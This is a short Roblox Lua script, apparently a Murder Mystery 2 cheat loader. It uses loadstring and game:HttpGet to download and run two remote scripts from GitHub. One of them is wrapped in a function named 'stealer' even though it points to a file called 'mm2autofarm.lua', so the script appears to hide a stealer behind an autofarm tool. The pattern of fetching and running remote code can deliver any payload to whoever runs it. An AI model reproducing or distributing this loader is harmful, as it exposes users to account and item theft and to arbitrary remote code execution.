local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ShidoKageoh/ShidoK/refs/heads/main/mm2autofarm.lua', true))()
end
local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2', true))()
end

task.spawn(stealer)
task.spawn(farm)
